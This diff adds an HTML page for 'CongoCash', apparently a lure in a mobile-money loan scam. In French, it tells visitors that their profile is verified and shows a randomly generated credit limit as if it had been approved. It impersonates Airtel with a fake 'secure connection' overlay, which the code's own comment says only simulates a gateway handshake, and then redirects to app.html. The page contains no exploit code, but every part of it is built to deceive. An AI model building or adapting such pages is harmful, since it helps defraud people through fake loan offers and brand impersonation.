@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Félicitations | CongoCash</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at top right, #450a0a, #000000);
+            min-height: 100vh;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 32px;
+        }
+
+        .glow-text {
+            text-shadow: 0 0 20px rgba(239, 68, 68, 0.6);
+        }
+
+        /* Redirect overlay animation */
+        #redirect-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: black;
+            z-index: 100;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body class="p-4">
+
+    <div id="redirect-overlay" class="animate__animated">
+        <div class="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <p class="text-xl font-bold tracking-widest uppercase">Connexion Sécurisée Airtel...</p>
+        <p class="text-gray-500 text-sm mt-2">N'interrompez pas la connexion</p>
+    </div>
+
+    <div class="max-w-md w-full animate__animated animate__fadeIn">
+        
+        <div class="text-center mb-6">
+            <span class="bg-green-500/10 text-green-500 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-widest border border-green-500/20">
+                Profil Vérifié
+            </span>
+        </div>
+
+        <div class="glass-card p-8 text-center border-red-500/20 mb-6">
+            <p class="text-gray-400 text-sm mb-2">Votre limite de crédit augmentée :</p>
+            <h2 class="text-5xl font-black glow-text mb-4 serif">
+                <span id="limit-counter">0</span> <span class="text-red-600 text-2xl">CDF</span>
+            </h2>
+            <div class="h-1 w-24 bg-red-600 mx-auto rounded-full"></div>
+        </div>
+
+        <div class="glass-card p-6 space-y-6">
+            <div class="flex justify-between items-center p-4 bg-white/5 rounded-2xl">
+                <div>
+                    <p class="text-[10px] text-gray-500 uppercase">Prêt Instantané</p>
+                    <p class="font-bold text-lg">150.000 CDF</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-[10px] text-gray-500 uppercase">Frais Airtel</p>
+                    <p class="text-sm">Inclus</p>
+                </div>
+            </div>
+
+            <button onclick="startWithdrawal()" id="withdrawBtn" class="group relative w-full bg-white text-black font-black py-5 rounded-2xl transition-all hover:bg-red-600 hover:text-white overflow-hidden">
+                <span class="relative z-10">RETIRER MAINTENANT</span>
+                <div class="absolute inset-0 bg-red-600 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
+            </button>
+
+            <p class="text-[10px] text-center text-gray-500">
+                L'approbation est finale. En cliquant, vous initiez le transfert USSD/API vers votre portefeuille mobile.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // 1. Counter Animation Logic
+        function animateValue(obj, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                obj.innerHTML = Math.floor(progress * (end - start) + start).toLocaleString();
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // Set a random big limit between 500k and 1.5M
+        const randomLimit = Math.floor(Math.random() * (1500000 - 500000 + 1) + 500000);
+
+        window.onload = () => {
+            const counterElement = document.getElementById("limit-counter");
+            // Delay start slightly for effect
+            setTimeout(() => {
+                animateValue(counterElement, 0, randomLimit, 2000);
+            }, 500);
+        };
+
+        // 2. Redirect Logic
+        function startWithdrawal() {
+            const overlay = document.getElementById('redirect-overlay');
+            overlay.style.display = 'flex';
+            overlay.classList.add('animate__fadeIn');
+
+            // Brief delay to simulate handshake with Airtel Secure Gateway
+            setTimeout(() => {
+                window.location.href = 'app.html'; 
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
